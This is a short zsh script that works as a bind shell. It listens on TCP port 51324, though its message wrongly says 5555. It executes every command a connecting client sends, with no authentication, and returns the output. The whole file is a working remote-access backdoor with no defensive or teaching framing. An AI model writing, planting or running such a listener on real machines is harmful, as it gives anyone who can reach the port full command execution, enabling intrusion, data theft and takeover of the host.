#!/bin/zsh

zmodload zsh/net/tcp
ztcp -l 51324
listen_fd=$REPLY
echo "Listining on 5555"


while true; do
    ztcp -a $listen_fd
    conn_fd=$REPLY
    echo "client Connected"

    {
        while read line <&$conn_fd; do
            cmd=(${=line})

            case "${cmd[1]}" in
                cd)

                    if [[ -n "${cmd[2]}" ]]; then
                        if cd "${cmd[2]}" 2>/dev/null; then
                            print -r -- "OK $(pwd)" >&$conn_fd
                        else
                            print -r -- "cd: no such dir" >&$conn_fd
                        fi
                    else
                        cd ~
                        print -r -- "OK $(pwd)" >&$conn_fd
                    fi
                    ;;
                pwd)
                    print -r -- "$(pwd)" >&$conn_fd
                    ;;
                *)
                    if output=$("${cmd[@]}" 2>&1); then
                        print -r -- "$output" >&$conn_fd
                    else
                        print -r -- "$output" >&$conn_fd
                    fi
                    ;;
                esac
        done
    } &
    
done



